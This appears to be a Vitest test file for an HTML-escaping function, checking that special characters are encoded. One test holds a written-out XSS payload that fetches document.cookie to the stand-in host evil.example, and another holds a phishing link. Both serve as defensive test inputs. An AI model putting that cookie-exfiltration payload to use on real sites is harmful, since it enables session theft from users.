import { describe, expect, it } from "vitest";
import { escapeHtml } from "@/lib/server/noon-storage";

describe("escapeHtml", () => {
  it("returns plain text unchanged", () => {
    expect(escapeHtml("Pedro Beltran")).toBe("Pedro Beltran");
  });

  it("escapes ampersands first to avoid double encoding", () => {
    expect(escapeHtml("Rock & Roll")).toBe("Rock &amp; Roll");
    expect(escapeHtml("&amp;")).toBe("&amp;amp;");
  });

  it("escapes the five HTML-significant characters", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
    expect(escapeHtml('a "quoted" b')).toBe("a &quot;quoted&quot; b");
    expect(escapeHtml("it's")).toBe("it&#39;s");
  });

  it("neutralises a script payload", () => {
    const payload = "<script>fetch('https://evil.example/'+document.cookie)</script>";
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
  });

  it("neutralises a styled phishing link", () => {
    const payload = '<a href="https://phish.example" style="color:blue">Click</a>';
    const escaped = escapeHtml(payload);
    expect(escaped).not.toMatch(/<a\s/i);
    expect(escaped).toContain("&lt;a href=&quot;");
  });

  it("handles empty string", () => {
    expect(escapeHtml("")).toBe("");
  });
});
